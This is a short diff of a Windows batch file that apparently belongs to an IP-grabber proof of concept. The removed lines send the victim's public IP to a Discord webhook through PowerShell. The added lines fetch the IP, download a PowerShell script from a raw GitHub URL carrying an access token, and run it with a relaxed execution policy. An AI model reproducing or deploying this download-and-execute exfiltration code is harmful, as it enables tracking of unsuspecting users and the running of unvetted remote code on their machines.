@@ -1,10 +1,6 @@
 @echo off
-curl https://ip.aruljohn.com/ > ip.txt
-Powershell.exe -executionpolicy remotesigned -File 
 
-$webhookUri = 'https://discord.com/api/YourWebhookUrlHere'
-$Body = @{
-  'username' = Get-Content ip.txt
-  'content' = Get-Content ip.txt
-}
-Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+curl https://ip.aruljohn.com/ > ip.txt
+curl https://raw.githubusercontent.com/DorkYBru/PoC-Ip-Grab-By-Cmd-windows/main/segs.ps1?token=GHSAT0AAAAAABUD76W3VGVUKIFFOHDVBZYAYUAAIFQ > script.ps1
+Powershell.exe -executionpolicy remotesigned -File script.ps1
+
